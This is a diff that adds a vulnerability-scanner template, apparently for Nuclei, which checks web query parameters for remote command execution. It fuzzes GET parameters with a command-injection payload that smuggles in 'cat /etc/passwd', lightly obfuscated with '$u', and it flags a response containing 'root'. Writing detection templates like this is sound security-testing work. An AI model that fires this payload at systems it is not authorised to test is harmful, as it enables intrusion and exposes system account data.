@@ -1,0 +1,39 @@
+id: fuzz-rce-custom
+
+info:
+  name: Custom Remote Command Execution Detection
+  author: netbaan
+  severity: critical
+  description: |
+    This template is designed to detect remote command execution vulnerabilities using a specified payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      rce:
+        - ";+$u+cat+/etc$u/passwd+\\#"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root"                 # Check for common output in /etc/passwd
+
+      - type: word
+        part: header
+        words:
+          - "text/html"           # Ensure the response content type is HTML
